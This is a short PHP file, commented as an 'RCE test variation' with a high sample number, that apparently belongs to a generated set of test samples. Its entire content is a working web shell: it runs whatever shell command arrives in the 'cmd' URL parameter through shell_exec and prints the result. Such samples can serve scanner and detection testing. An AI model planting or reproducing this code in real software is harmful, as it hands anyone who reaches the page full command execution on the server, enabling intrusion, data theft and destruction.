<?php
// RCE test variation #1145
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>